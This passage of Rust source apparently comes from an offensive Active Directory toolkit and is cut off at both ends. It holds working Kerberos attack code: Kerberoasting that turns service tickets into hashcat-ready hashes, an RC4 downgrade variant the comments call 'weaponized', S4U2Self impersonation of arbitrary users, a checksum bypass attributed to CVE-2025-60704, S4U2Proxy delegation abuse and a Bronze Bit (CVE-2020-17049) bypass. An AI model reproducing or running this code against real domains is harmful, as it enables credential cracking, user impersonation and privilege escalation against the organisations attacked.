                    client_principal: clean_username.to_string(),
                    client_realm: current_realm,
                    end_time: Some(enc_part.endtime),
                });
            }
            Err(_) => {
                if let Some(suggested) = extract_wrong_realm(&response_bytes) {
                    if hop >= 2 {
                        return Err(OverthroneError::Kerberos(format!(
                            "KDC_ERR_WRONG_REALM: exceeded max referral hops (referred to '{suggested}')"
                        )));
                    }
                    info!("KDC referred us to realm '{suggested}' (hop {hop})");

                    match resolve_realm_kdc(&suggested).await {
                        Ok(new_dc) => {
                            current_dc = new_dc;
                            current_realm = suggested;
                            continue;
                        }
                        Err(e) => {
                            return Err(OverthroneError::Kerberos(format!(
                                "KDC_ERR_WRONG_REALM: referred to '{suggested}' but DNS SRV resolution failed: {e}"
                            )));
                        }
                    }
                }
                return Err(parse_krb_error(&response_bytes));
            }
        }
    }

    Err(OverthroneError::Kerberos(
        "request_tgt_opsec: referral loop exhausted".to_string(),
    ))
}

// ═══════════════════════════════════════════════════════════
//  Kerberoasting (TGS-REQ for target SPN)
// ═══════════════════════════════════════════════════════════

/// Request a service ticket for an SPN and extract the crackable hash.
/// Requires a valid TGT from `request_tgt()`.
pub async fn kerberoast(
    dc_ip: &str,
    tgt: &TicketGrantingData,
    target_spn: &str,
) -> Result<CrackableHash> {
    info!("Kerberoasting SPN: {target_spn}");
    let realm = &tgt.client_realm;

    // Parse SPN "service/host" into PrincipalName
    let spn_parts: Vec<&str> = target_spn.splitn(2, '/').collect();
    let sname = PrincipalName {
        name_type: NT_SRV_INST,
        name_string: spn_parts.iter().map(|s| s.to_string()).collect(),
    };

    // Build AP-REQ (ticket + authenticator)
    let encrypted_auth = build_encrypted_authenticator(
        realm,
        &tgt.client_principal,
        &tgt.session_key,
        tgt.session_key_etype,
    )?;
    let ap_req = build_ap_req(&tgt.ticket, encrypted_auth);

    let pa_tgs = PaData {
        padata_type: PA_TGS_REQ,
        padata_value: ap_req.build(),
    };

    let req_body = build_tgs_req_body(
        realm,
        sname,
        &[ETYPE_RC4_HMAC, ETYPE_AES256_CTS, ETYPE_AES128_CTS],
        KDC_OPT_FORWARDABLE | KDC_OPT_RENEWABLE | KDC_OPT_CANONICALIZE,
        None,
        None,
    );

    let tgs_req = TgsReq {
        pvno: 5,
        msg_type: 12,
        padata: Some(vec![pa_tgs]),
        req_body,
    };

    let response_bytes = kdc_exchange(dc_ip, &tgs_req.build()).await?;

    let (_, tgs_rep) =
        TgsRep::parse(&response_bytes).map_err(|_| parse_krb_error(&response_bytes))?;

    // Extract encrypted part of the SERVICE TICKET for offline cracking.
    // Hashcat expects the cipher split into checksum and encrypted data.
    // ALL etypes use the same `*user$realm$spn*` wrapping:
    //   RC4  (mode 13100): $krb5tgs$23$*user$realm$spn*$<checksum_32hex>$<edata2_hex>
    //     checksum = first 16 bytes of cipher
    //   AES128 (mode 19600): $krb5tgs$17$*user$realm$spn*$<checksum_24hex>$<edata2_hex>
    //     checksum = first 12 bytes of cipher
    //   AES256 (mode 19700): $krb5tgs$18$*user$realm$spn*$<checksum_24hex>$<edata2_hex>
    //     checksum = first 12 bytes of cipher
    let enc_part = &tgs_rep.ticket.enc_part;
    let cipher = &enc_part.cipher;

    let hash_string = format_tgs_hash_string(
        enc_part.etype,
        &tgt.client_principal,
        realm,
        target_spn,
        cipher,
    );

    info!(
        "Kerberoast hash for {target_spn} (etype: {})",
        enc_part.etype
    );
    Ok(CrackableHash {
        username: tgt.client_principal.clone(),
        domain: realm.to_string(),
        spn: Some(target_spn.to_string()),
        hash_type: HashType::Kerberoast,
        etype: enc_part.etype,
        hash_string,
    })
}

/// Kerberoast with FAST armoring (RFC 6806).
///
/// Same as `kerberoast()` but wraps the TGS-REQ in a KrbFastRequest.
/// Required for WS2025 domains with FAST enforcement.
pub async fn kerberoast_fast(
    dc_ip: &str,
    tgt: &TicketGrantingData,
    target_spn: &str,
) -> Result<CrackableHash> {
    info!("FAST Kerberoasting SPN: {target_spn}");
    let realm = &tgt.client_realm;

    let spn_parts: Vec<&str> = target_spn.splitn(2, '/').collect();
    let sname = PrincipalName {
        name_type: NT_SRV_INST,
        name_string: spn_parts.iter().map(|s| s.to_string()).collect(),
    };

    let req_body = build_tgs_req_body(
        realm,
        sname,
        &[ETYPE_RC4_HMAC, ETYPE_AES256_CTS, ETYPE_AES128_CTS],
        KDC_OPT_FORWARDABLE | KDC_OPT_RENEWABLE | KDC_OPT_CANONICALIZE,
        None,
        None,
    );

    let req_body_der = req_body.build();
    let ticket_der = tgt.ticket.build();
    let fast_pa = build_fast_armor(&FastArmorParams {
        inner_req_body_der: &req_body_der,
        tgt_ticket_der: &ticket_der,
        tgt_session_key: &tgt.session_key,
        session_key_etype: tgt.session_key_etype,
        client_realm: realm,
    })?;

    let pa_data_fast = PaData {
        padata_type: PA_FX_FAST,
        padata_value: fast_pa,
    };
    let tgs_req = TgsReq {
        pvno: 5,
        msg_type: 12,
        padata: Some(vec![pa_data_fast]),
        req_body,
    };

    let response_bytes = kdc_exchange(dc_ip, &tgs_req.build()).await?;

    let (_, tgs_rep) =
        TgsRep::parse(&response_bytes).map_err(|_| parse_krb_error(&response_bytes))?;

    let enc_part = &tgs_rep.ticket.enc_part;
    let cipher = &enc_part.cipher;

    let hash_string = format_tgs_hash_string(
        enc_part.etype,
        &tgt.client_principal,
        realm,
        target_spn,
        cipher,
    );

    info!(
        "FAST Kerberoast hash for {target_spn} (etype: {})",
        enc_part.etype
    );
    Ok(CrackableHash {
        username: tgt.client_principal.clone(),
        domain: realm.to_string(),
        spn: Some(target_spn.to_string()),
        hash_type: HashType::Kerberoast,
        etype: enc_part.etype,
        hash_string,
    })
}

/// Kerberoast with etype filtering (aes_only / downgrade_to_rc4).
///
/// When `aes_only=true`: only AES256/AES128 etypes are requested (OPSEC mode).
/// When `aes_only=false`: only RC4_HMAC (etype 23) is requested (faster cracking).
///
/// This is the weaponized version of `kerberoast()` for scenarios where you
/// want to control which encryption type the KDC uses for the service ticket.
pub async fn kerberoast_ex(
    dc_ip: &str,
    tgt: &TicketGrantingData,
    target_spn: &str,
    aes_only: bool,
) -> Result<CrackableHash> {
    let etypes: &[i32] = if aes_only {
        &[ETYPE_AES256_CTS, ETYPE_AES128_CTS]
    } else {
        &[ETYPE_RC4_HMAC]
    };

    info!("Kerberoasting SPN: {target_spn} (etypes: {etypes:?})");
    let realm = &tgt.client_realm;

    let spn_parts: Vec<&str> = target_spn.splitn(2, '/').collect();
    let sname = PrincipalName {
        name_type: NT_SRV_INST,
        name_string: spn_parts.iter().map(|s| s.to_string()).collect(),
    };

    let encrypted_auth = build_encrypted_authenticator(
        realm,
        &tgt.client_principal,
        &tgt.session_key,
        tgt.session_key_etype,
    )?;
    let ap_req = build_ap_req(&tgt.ticket, encrypted_auth);

    let pa_tgs = PaData {
        padata_type: PA_TGS_REQ,
        padata_value: ap_req.build(),
    };

    let req_body = build_tgs_req_body(
        realm,
        sname,
        etypes,
        KDC_OPT_FORWARDABLE | KDC_OPT_RENEWABLE | KDC_OPT_CANONICALIZE,
        None,
        None,
    );

    let tgs_req = TgsReq {
        pvno: 5,
        msg_type: 12,
        padata: Some(vec![pa_tgs]),
        req_body,
    };

    let response_bytes = kdc_exchange(dc_ip, &tgs_req.build()).await?;

    let (_, tgs_rep) =
        TgsRep::parse(&response_bytes).map_err(|_| parse_krb_error(&response_bytes))?;

    let enc_part = &tgs_rep.ticket.enc_part;
    let cipher = &enc_part.cipher;

    let hash_string = format_tgs_hash_string(
        enc_part.etype,
        &tgt.client_principal,
        realm,
        target_spn,
        cipher,
    );

    info!(
        "Kerberoast hash for {target_spn} (etype: {})",
        enc_part.etype
    );
    Ok(CrackableHash {
        username: tgt.client_principal.clone(),
        domain: realm.to_string(),
        spn: Some(target_spn.to_string()),
        hash_type: HashType::Kerberoast,
        etype: enc_part.etype,
        hash_string,
    })
}

/// Request a service ticket (TGS) for an arbitrary SPN and return
/// the decrypted ticket + session key as TicketGrantingData.
/// This is the generic "give me a usable service ticket" function,
/// as opposed to `kerberoast()` which only extracts the crackable hash.
/// Requires a valid TGT from `request_tgt()`.
pub async fn request_service_ticket(
    dc_ip: &str,
    tgt: &TicketGrantingData,
    target_spn: &str,
) -> Result<TicketGrantingData> {
    let realm = &tgt.client_realm;
    info!("Requesting service ticket for SPN: {target_spn}");

    // Parse SPN "service/host" into PrincipalName
    let spn_parts: Vec<&str> = target_spn.splitn(2, '/').collect();
    let sname = PrincipalName {
        name_type: NT_SRV_INST,
        name_string: spn_parts.iter().map(|s| s.to_string()).collect(),
    };

    // Build AP-REQ (TGT ticket + authenticator encrypted with TGT session key)
    let encrypted_auth = build_encrypted_authenticator(
        realm,
        &tgt.client_principal,
        &tgt.session_key,
        tgt.session_key_etype,
    )?;
    let ap_req = build_ap_req(&tgt.ticket, encrypted_auth);

    let pa_tgs = PaData {
        padata_type: PA_TGS_REQ,
        padata_value: ap_req.build(),
    };

    let mut current_dc = dc_ip.to_string();
    let mut current_realm = realm.clone();

    for hop in 0..=2 {
        // Build TGS-REQ body targeting the SPN
        let req_body = build_tgs_req_body(
            &current_realm,
            sname.clone(),
            &[
                tgt.session_key_etype,
                ETYPE_RC4_HMAC,
                ETYPE_AES256_CTS,
                ETYPE_AES128_CTS,
            ],
            KDC_OPT_FORWARDABLE | KDC_OPT_RENEWABLE | KDC_OPT_CANONICALIZE,
            None,
            None,
        );

        let tgs_req = TgsReq {
            pvno: 5,
            msg_type: 12,
            padata: Some(vec![pa_tgs.clone()]),
            req_body,
        };

        // Exchange with KDC
        let response_bytes = kdc_exchange(&current_dc, &tgs_req.build()).await?;

        // Parse TGS-REP
        match TgsRep::parse(&response_bytes) {
            Ok((_, tgs_rep)) => {
                // Decrypt enc-part with TGT session key (key usage 8 for TGS-REP)
                let cipher = new_kerberos_cipher(tgt.session_key_etype)
                    .map_err(|e| OverthroneError::Kerberos(format!("Cipher init: {e}")))?;

                let decrypted = cipher
                    .decrypt(&tgt.session_key, 8, &tgs_rep.enc_part.cipher)
                    .map_err(|e| {
                        OverthroneError::Kerberos(format!("TGS-REP decrypt failed: {e}"))
                    })?;

                let (_, enc_tgs) = EncTgsRepPart::parse(&decrypted)
                    .map_err(|e| OverthroneError::Kerberos(format!("Parse EncTgsRepPart: {e}")))?;

                info!(
                    "Service ticket for {target_spn} obtained (etype: {})",
                    enc_tgs.key.keytype
                );

                return Ok(TicketGrantingData {
                    ticket: tgs_rep.ticket,
                    session_key: enc_tgs.key.keyvalue,
                    session_key_etype: enc_tgs.key.keytype,
                    client_principal: tgt.client_principal.clone(),
                    client_realm: current_realm,
                    end_time: Some(enc_tgs.endtime),
                });
            }
            Err(_) => {
                if let Some(suggested) = extract_wrong_realm(&response_bytes) {
                    if hop >= 2 {
                        return Err(OverthroneError::Kerberos(format!(
                            "request_service_ticket: exceeded max referral hops (referred to '{suggested}')"
                        )));
                    }
                    info!(
                        "request_service_ticket: KDC referred to realm '{suggested}' (hop {hop})"
                    );
                    match resolve_realm_kdc(&suggested).await {
                        Ok(new_dc) => {
                            current_dc = new_dc;
                            current_realm = suggested;
                            continue;
                        }
                        Err(e) => {
                            return Err(OverthroneError::Kerberos(format!(
                                "request_service_ticket: referred to '{suggested}' but DNS SRV resolution failed: {e}"
                            )));
                        }
                    }
                }
                return Err(parse_krb_error(&response_bytes));
            }
        }
    }

    Err(OverthroneError::Kerberos(
        "request_service_ticket: referral loop exhausted".to_string(),
    ))
}

/// Request a service ticket with FAST armoring (RFC 6806).
///
/// Wraps the TGS-REQ in a KrbFastRequest using the TGT as the armor
/// ticket. Required for WS2025 domains with FAST enforcement.
pub async fn request_service_ticket_fast(
    dc_ip: &str,
    tgt: &TicketGrantingData,
    target_spn: &str,
) -> Result<TicketGrantingData> {
    let realm = &tgt.client_realm;
    info!("Requesting FAST-armored service ticket for SPN: {target_spn}");

    let spn_parts: Vec<&str> = target_spn.splitn(2, '/').collect();
    let sname = PrincipalName {
        name_type: NT_SRV_INST,
        name_string: spn_parts.iter().map(|s| s.to_string()).collect(),
    };

    let mut current_dc = dc_ip.to_string();
    let mut current_realm = realm.clone();

    for hop in 0..=2 {
        let req_body = build_tgs_req_body(
            &current_realm,
            sname.clone(),
            &[
                tgt.session_key_etype,
                ETYPE_RC4_HMAC,
                ETYPE_AES256_CTS,
                ETYPE_AES128_CTS,
            ],
            KDC_OPT_FORWARDABLE | KDC_OPT_RENEWABLE | KDC_OPT_CANONICALIZE,
            None,
            None,
        );

        let req_body_der = req_body.build();
        let ticket_der = tgt.ticket.build();
        let fast_pa = build_fast_armor(&FastArmorParams {
            inner_req_body_der: &req_body_der,
            tgt_ticket_der: &ticket_der,
            tgt_session_key: &tgt.session_key,
            session_key_etype: tgt.session_key_etype,
            client_realm: &current_realm,
        })?;

        let pa_data_fast = PaData {
            padata_type: PA_FX_FAST,
            padata_value: fast_pa,
        };
        let tgs_req = TgsReq {
            pvno: 5,
            msg_type: 12,
            padata: Some(vec![pa_data_fast]),
            req_body,
        };

        let response_bytes = kdc_exchange(&current_dc, &tgs_req.build()).await?;

        match TgsRep::parse(&response_bytes) {
            Ok((_, tgs_rep)) => {
                let cipher = new_kerberos_cipher(tgt.session_key_etype)
                    .map_err(|e| OverthroneError::Kerberos(format!("Cipher init: {e}")))?;

                let decrypted = cipher
                    .decrypt(&tgt.session_key, 8, &tgs_rep.enc_part.cipher)
                    .map_err(|e| {
                        OverthroneError::Kerberos(format!("FAST TGS-REP decrypt failed: {e}"))
                    })?;

                let (_, enc_tgs) = EncTgsRepPart::parse(&decrypted).map_err(|e| {
                    OverthroneError::Kerberos(format!("Parse FAST EncTgsRepPart: {e}"))
                })?;

                info!(
                    "FAST service ticket for {target_spn} obtained (etype: {})",
                    enc_tgs.key.keytype
                );

                return Ok(TicketGrantingData {
                    ticket: tgs_rep.ticket,
                    session_key: enc_tgs.key.keyvalue,
                    session_key_etype: enc_tgs.key.keytype,
                    client_principal: tgt.client_principal.clone(),
                    client_realm: current_realm,
                    end_time: Some(enc_tgs.endtime),
                });
            }
            Err(_) => {
                if let Some(suggested) = extract_wrong_realm(&response_bytes) {
                    if hop >= 2 {
                        return Err(OverthroneError::Kerberos(format!(
                            "request_service_ticket_fast: exceeded max referral hops (referred to '{suggested}')"
                        )));
                    }
                    info!("FAST TGS: KDC referred to realm '{suggested}' (hop {hop})");
                    match resolve_realm_kdc(&suggested).await {
                        Ok(new_dc) => {
                            current_dc = new_dc;
                            current_realm = suggested;
                            continue;
                        }
                        Err(e) => {
                            return Err(OverthroneError::Kerberos(format!(
                                "request_service_ticket_fast: referred to '{suggested}' but DNS SRV resolution failed: {e}"
                            )));
                        }
                    }
                }
                return Err(parse_krb_error(&response_bytes));
            }
        }
    }

    Err(OverthroneError::Kerberos(
        "request_service_ticket_fast: referral loop exhausted".to_string(),
    ))
}

// ═══════════════════════════════════════════════════════════
//  S4U2Self — Impersonate any user to ourselves
// ═══════════════════════════════════════════════════════════

/// S4U2Self: Request a service ticket on behalf of another user.
/// Used in constrained delegation attacks.
/// Supports cross-domain referral (up to 2 hops).
pub async fn s4u2self(
    dc_ip: &str,
    tgt: &TicketGrantingData,
    impersonate_user: &str,
) -> Result<TicketGrantingData> {
    let realm = &tgt.client_realm;
    let clean_impersonate_user = normalize_username(impersonate_user);
    info!("S4U2Self: impersonating {clean_impersonate_user}@{realm}");

    // Build PA-FOR-USER
    let pa_for_user_data = PaForUser {
        username: PrincipalName {
            name_type: NT_PRINCIPAL,
            name_string: vec![clean_impersonate_user.to_string()],
        },
        userrealm: realm.to_string(),
        cksum: build_s4u2self_checksum(clean_impersonate_user, realm, &tgt.session_key)?,
        auth_package: "Kerberos".to_string(),
    };

    let encrypted_auth = build_encrypted_authenticator(
        realm,
        &tgt.client_principal,
        &tgt.session_key,
        tgt.session_key_etype,
    )?;
    let ap_req = build_ap_req(&tgt.ticket, encrypted_auth);

    let pa_tgs = PaData {
        padata_type: PA_TGS_REQ,
        padata_value: ap_req.build(),
    };
    let pa_for_user = PaData {
        padata_type: PA_FOR_USER,
        padata_value: pa_for_user_data.build(),
    };

    let sname = PrincipalName {
        name_type: NT_PRINCIPAL,
        name_string: vec![tgt.client_principal.clone()],
    };

    let mut current_dc = dc_ip.to_string();
    let mut current_realm = realm.clone();

    for hop in 0..=2 {
        let req_body = build_tgs_req_body(
            &current_realm,
            sname.clone(),
            &[tgt.session_key_etype],
            KDC_OPT_FORWARDABLE,
            None,
            Some(PrincipalName {
                name_type: NT_PRINCIPAL,
                name_string: vec![tgt.client_principal.clone()],
            }),
        );

        let tgs_req = TgsReq {
            pvno: 5,
            msg_type: 12,
            padata: Some(vec![pa_tgs.clone(), pa_for_user.clone()]),
            req_body,
        };

        let response_bytes = kdc_exchange(&current_dc, &tgs_req.build()).await?;

        match TgsRep::parse(&response_bytes) {
            Ok((_, tgs_rep)) => {
                let cipher = new_kerberos_cipher(tgt.session_key_etype)
                    .map_err(|e| OverthroneError::Kerberos(format!("Cipher: {e}")))?;

                let decrypted = cipher
                    .decrypt(&tgt.session_key, 8, &tgs_rep.enc_part.cipher)
                    .map_err(|e| OverthroneError::Kerberos(format!("S4U2Self decrypt: {e}")))?;

                let (_, enc_tgs) = EncTgsRepPart::parse(&decrypted)
                    .map_err(|e| OverthroneError::Kerberos(format!("Parse EncTgsRepPart: {e}")))?;

                info!("S4U2Self ticket for {impersonate_user} obtained");
                return Ok(TicketGrantingData {
                    ticket: tgs_rep.ticket,
                    session_key: enc_tgs.key.keyvalue,
                    session_key_etype: enc_tgs.key.keytype,
                    client_principal: impersonate_user.to_string(),
                    client_realm: current_realm,
                    end_time: Some(enc_tgs.endtime),
                });
            }
            Err(_) => {
                if let Some(suggested) = extract_wrong_realm(&response_bytes) {
                    if hop >= 2 {
                        return Err(OverthroneError::Kerberos(format!(
                            "S4U2Self: exceeded max referral hops (referred to '{suggested}')"
                        )));
                    }
                    info!("S4U2Self: KDC referred to realm '{suggested}' (hop {hop})");
                    match resolve_realm_kdc(&suggested).await {
                        Ok(new_dc) => {
                            current_dc = new_dc;
                            current_realm = suggested;
                            continue;
                        }
                        Err(e) => {
                            return Err(OverthroneError::Kerberos(format!(
                                "S4U2Self: referred to '{suggested}' but DNS SRV resolution failed: {e}"
                            )));
                        }
                    }
                }
                return Err(parse_krb_error(&response_bytes));
            }
        }
    }

    Err(OverthroneError::Kerberos(
        "S4U2Self: referral loop exhausted".to_string(),
    ))
}

/// S4U2Self with PA-PAC-OPTIONS and optional checksum bypass for CVE-2025-60704.
///
/// This is a modified s4u2self that:
/// 1. Includes PA-PAC-OPTIONS in the TGS-REQ padata (triggers bypass on vulnerable KDC)
/// 2. Uses a caller-provided checksum in PA-FOR-USER (null, mismatched, or replayed)
/// 3. Reports back whether the KDC accepted the modified request
///
/// Returns `(TicketGrantingData, bool)` where the bool indicates whether the
/// checksum bypass technique succeeded (KDC accepted the modified checksum).
pub async fn s4u2self_with_checksum_bypass(
    dc_ip: &str,
    tgt: &TicketGrantingData,
    impersonate_user: &str,
    pac_flags: Option<u32>,
    custom_checksum: Option<Checksum>,
) -> Result<(TicketGrantingData, bool)> {
    let realm = &tgt.client_realm;
    let clean_impersonate_user = normalize_username(impersonate_user);
    info!("S4U2Self-bypass: impersonating {clean_impersonate_user}@{realm}");

    let had_custom_checksum = custom_checksum.is_some();
    let cksum = match custom_checksum {
        Some(cs) => cs,
        None => build_s4u2self_checksum(clean_impersonate_user, realm, &tgt.session_key)?,
    };

    let pa_for_user_data = PaForUser {
        username: PrincipalName {
            name_type: NT_PRINCIPAL,
            name_string: vec![clean_impersonate_user.to_string()],
        },
        userrealm: realm.to_string(),
        cksum,
        auth_package: "Kerberos".to_string(),
    };

    let encrypted_auth = build_encrypted_authenticator(
        realm,
        &tgt.client_principal,
        &tgt.session_key,
        tgt.session_key_etype,
    )?;
    let ap_req = build_ap_req(&tgt.ticket, encrypted_auth);

    let pa_tgs = PaData {
        padata_type: PA_TGS_REQ,
        padata_value: ap_req.build(),
    };
    let pa_for_user = PaData {
        padata_type: PA_FOR_USER,
        padata_value: pa_for_user_data.build(),
    };

    // Conditionally add PA-PAC-OPTIONS
    let pa_pac_options = pac_flags.map(build_pa_pac_options);

    let sname = PrincipalName {
        name_type: NT_PRINCIPAL,
        name_string: vec![tgt.client_principal.clone()],
    };

    let mut current_dc = dc_ip.to_string();
    let mut current_realm = realm.clone();

    for hop in 0..=2 {
        let req_body = build_tgs_req_body(
            &current_realm,
            sname.clone(),
            &[tgt.session_key_etype],
            KDC_OPT_FORWARDABLE,
            None,
            Some(PrincipalName {
                name_type: NT_PRINCIPAL,
                name_string: vec![tgt.client_principal.clone()],
            }),
        );

        let mut padata = vec![pa_tgs.clone(), pa_for_user.clone()];
        if let Some(ref opt) = pa_pac_options {
            padata.push(opt.clone());
        }

        let tgs_req = TgsReq {
            pvno: 5,
            msg_type: 12,
            padata: Some(padata),
            req_body,
        };

        let response_bytes = kdc_exchange(&current_dc, &tgs_req.build()).await?;

        match TgsRep::parse(&response_bytes) {
            Ok((_, tgs_rep)) => {
                let cipher = new_kerberos_cipher(tgt.session_key_etype)
                    .map_err(|e| OverthroneError::Kerberos(format!("Cipher: {e}")))?;

                let decrypted = cipher
                    .decrypt(&tgt.session_key, 8, &tgs_rep.enc_part.cipher)
                    .map_err(|e| OverthroneError::Kerberos(format!("S4U2Self decrypt: {e}")))?;

                let (_, enc_tgs) = EncTgsRepPart::parse(&decrypted)
                    .map_err(|e| OverthroneError::Kerberos(format!("Parse EncTgsRepPart: {e}")))?;

                // If we provided custom checksum and got a ticket back, bypass succeeded
                let bypass_succeeded = had_custom_checksum || pac_flags.is_some();

                info!(
                    "S4U2Self-bypass ticket for {impersonate_user} obtained (bypass={bypass_succeeded})"
                );
                return Ok((
                    TicketGrantingData {
                        ticket: tgs_rep.ticket,
                        session_key: enc_tgs.key.keyvalue,
                        session_key_etype: enc_tgs.key.keytype,
                        client_principal: impersonate_user.to_string(),
                        client_realm: current_realm,
                        end_time: Some(enc_tgs.endtime),
                    },
                    bypass_succeeded,
                ));
            }
            Err(_) => {
                if let Some(suggested) = extract_wrong_realm(&response_bytes) {
                    if hop >= 2 {
                        return Err(OverthroneError::Kerberos(format!(
                            "S4U2Self-bypass: exceeded max referral hops (referred to '{suggested}')"
                        )));
                    }
                    info!("S4U2Self-bypass: KDC referred to realm '{suggested}' (hop {hop})");
                    match resolve_realm_kdc(&suggested).await {
                        Ok(new_dc) => {
                            current_dc = new_dc;
                            current_realm = suggested;
                            continue;
                        }
                        Err(e) => {
                            return Err(OverthroneError::Kerberos(format!(
                                "S4U2Self-bypass: referred to '{suggested}' but DNS SRV resolution failed: {e}"
                            )));
                        }
                    }
                }
                // KDC rejected the modified request — bypass technique failed
                return Err(parse_krb_error(&response_bytes));
            }
        }
    }

    Err(OverthroneError::Kerberos(
        "S4U2Self-bypass: referral loop exhausted".to_string(),
    ))
}
//  S4U2Proxy — Forward to target service
// ═══════════════════════════════════════════════════════════

/// S4U2Proxy: Use an S4U2Self ticket to get a ticket for a target service SPN.
/// Supports cross-domain referral: when the KDC responds with `KDC_ERR_WRONG_REALM`,
/// the function extracts the suggested realm, resolves its KDC via DNS SRV, and
/// retries (up to 2 referral hops).
pub async fn s4u2proxy(
    dc_ip: &str,
    tgt: &TicketGrantingData,
    s4u2self_ticket: &TicketGrantingData,
    target_spn: &str,
) -> Result<TicketGrantingData> {
    let realm = &tgt.client_realm;
    info!(
        "S4U2Proxy: {target_spn} as {}",
        s4u2self_ticket.client_principal
    );

    let spn_parts: Vec<&str> = target_spn.splitn(2, '/').collect();
    let sname = PrincipalName {
        name_type: NT_SRV_INST,
        name_string: spn_parts.iter().map(|s| s.to_string()).collect(),
    };

    let encrypted_auth = build_encrypted_authenticator(
        realm,
        &tgt.client_principal,
        &tgt.session_key,
        tgt.session_key_etype,
    )?;
    let ap_req = build_ap_req(&tgt.ticket, encrypted_auth);

    let mut current_dc = dc_ip.to_string();
    let mut current_realm = realm.clone();

    for hop in 0..=2 {
        let req_body = build_tgs_req_body(
            &current_realm,
            sname.clone(),
            &[tgt.session_key_etype],
            KDC_OPT_FORWARDABLE | KDC_OPT_CANONICALIZE | KDC_OPT_CNAME_IN_ADDL_TKT,
            Some(vec![s4u2self_ticket.ticket.clone()]),
            Some(PrincipalName {
                name_type: NT_PRINCIPAL,
                name_string: vec![tgt.client_principal.clone()],
            }),
        );

        let tgs_req = TgsReq {
            pvno: 5,
            msg_type: 12,
            padata: Some(vec![PaData {
                padata_type: PA_TGS_REQ,
                padata_value: ap_req.build(),
            }]),
            req_body,
        };

        let response_bytes = kdc_exchange(&current_dc, &tgs_req.build()).await?;

        match TgsRep::parse(&response_bytes) {
            Ok((_, tgs_rep)) => {
                let cipher = new_kerberos_cipher(tgt.session_key_etype)
                    .map_err(|e| OverthroneError::Kerberos(format!("Cipher: {e}")))?;

                let decrypted = cipher
                    .decrypt(&tgt.session_key, 8, &tgs_rep.enc_part.cipher)
                    .map_err(|e| OverthroneError::Kerberos(format!("S4U2Proxy decrypt: {e}")))?;

                let (_, enc_tgs) = EncTgsRepPart::parse(&decrypted)
                    .map_err(|e| OverthroneError::Kerberos(format!("Parse: {e}")))?;

                info!("S4U2Proxy ticket for {target_spn} obtained");
                return Ok(TicketGrantingData {
                    ticket: tgs_rep.ticket,
                    session_key: enc_tgs.key.keyvalue,
                    session_key_etype: enc_tgs.key.keytype,
                    client_principal: s4u2self_ticket.client_principal.clone(),
                    client_realm: current_realm,
                    end_time: Some(enc_tgs.endtime),
                });
            }
            Err(_) => {
                if let Some(suggested) = extract_wrong_realm(&response_bytes) {
                    if hop >= 2 {
                        return Err(OverthroneError::Kerberos(format!(
                            "S4U2Proxy: exceeded max referral hops (referred to '{suggested}')"
                        )));
                    }
                    info!("S4U2Proxy: KDC referred to realm '{suggested}' (hop {hop})");
                    match resolve_realm_kdc(&suggested).await {
                        Ok(new_dc) => {
                            current_dc = new_dc;
                            current_realm = suggested;
                            continue;
                        }
                        Err(e) => {
                            return Err(OverthroneError::Kerberos(format!(
                                "S4U2Proxy: referred to '{suggested}' but DNS SRV resolution failed: {e}"
                            )));
                        }
                    }
                }
                return Err(parse_krb_error(&response_bytes));
            }
        }
    }

    Err(OverthroneError::Kerberos(
        "S4U2Proxy: referral loop exhausted".to_string(),
    ))
}

/// S4U2Proxy with Bronze Bit (CVE-2020-17049) forwardable flag bypass.
///
/// Bronze Bit allows services with `TrustedToAuthForDelegation` to bypass the
/// "Sensitive and cannot be delegated" restriction. The KDC fails to check whether
/// the forwarded ticket has the FORWARDABLE flag set, so even non-forwardable
/// S4U2Self tickets can be used for delegation.
///
/// This function wraps `s4u2proxy` with optional PA-PAC-OPTIONS for explicit
/// proxy request flagging.
pub async fn s4u2proxy_bronzebit(
    dc_ip: &str,
    tgt: &TicketGrantingData,
    s4u2self_ticket: &TicketGrantingData,
    target_spn: &str,
    use_pac_options: bool,
) -> Result<TicketGrantingData> {
    info!(
        "BronzeBit S4U2Proxy: {target_spn} as {} (CVE-2020-17049)",
        s4u2self_ticket.client_principal
    );

    let realm = &tgt.client_realm;
    let spn_parts: Vec<&str> = target_spn.splitn(2, '/').collect();
    let sname = PrincipalName {
        name_type: NT_SRV_INST,
        name_string: spn_parts.iter().map(|s| s.to_string()).collect(),
    };

    let encrypted_auth = build_encrypted_authenticator(
        realm,
        &tgt.client_principal,
        &tgt.session_key,
        tgt.session_key_etype,
    )?;
    let ap_req = build_ap_req(&tgt.ticket, encrypted_auth);

    let mut current_dc = dc_ip.to_string();
    let mut current_realm = realm.clone();

    for hop in 0..=2 {
        let req_body = build_tgs_req_body(
            &current_realm,
            sname.clone(),
            &[tgt.session_key_etype],
            KDC_OPT_FORWARDABLE | KDC_OPT_CANONICALIZE | KDC_OPT_CNAME_IN_ADDL_TKT,
            Some(vec![s4u2self_ticket.ticket.clone()]),
            Some(PrincipalName {
                name_type: NT_PRINCIPAL,
                name_string: vec![tgt.client_principal.clone()],
            }),
        );

        let mut padata = vec![PaData {
            padata_type: PA_TGS_REQ,
            padata_value: ap_req.build(),
        }];

        // Optionally add PA-PAC-OPTIONS with proxy flags
        if use_pac_options {
            let pac_opts = build_pa_pac_options(0x00000001); // PAC_OPTIONS_FLAG_PROXY
            padata.push(pac_opts);
        }

        let tgs_req = TgsReq {
            pvno: 5,
            msg_type: 12,
            padata: Some(padata),
            req_body,
        };

        let response_bytes = kdc_exchange(&current_dc, &tgs_req.build()).await?;

        match TgsRep::parse(&response_bytes) {
            Ok((_, tgs_rep)) => {
                let tgt_cipher = new_kerberos_cipher(tgt.session_key_etype)
                    .map_err(|e| OverthroneError::Kerberos(format!("Cipher: {e}")))?;

                let decrypted = tgt_cipher
                    .decrypt(&tgt.session_key, 8, &tgs_rep.enc_part.cipher)
                    .map_err(|e| OverthroneError::Kerberos(format!("BronzeBit decrypt: {e}")))?;

                let (_, enc_tgs) = EncTgsRepPart::parse(&decrypted)
                    .map_err(|e| OverthroneError::Kerberos(format!("Parse: {e}")))?;

                info!("BronzeBit S4U2Proxy ticket for {target_spn} obtained");
                return Ok(TicketGrantingData {
                    ticket: tgs_rep.ticket,
                    session_key: enc_tgs.key.keyvalue,
                    session_key_etype: enc_tgs.key.keytype,
                    client_principal: s4u2self_ticket.client_principal.clone(),
                    client_realm: current_realm,
                    end_time: Some(enc_tgs.endtime),
                });
            }
            Err(_) => {
                if let Some(suggested) = extract_wrong_realm(&response_bytes) {
                    if hop >= 2 {
                        return Err(OverthroneError::Kerberos(format!(
                            "BronzeBit: exceeded max referral hops (referred to '{suggested}')"
                        )));
                    }
                    info!("BronzeBit: KDC referred to realm '{suggested}' (hop {hop})");
                    match resolve_realm_kdc(&suggested).await {
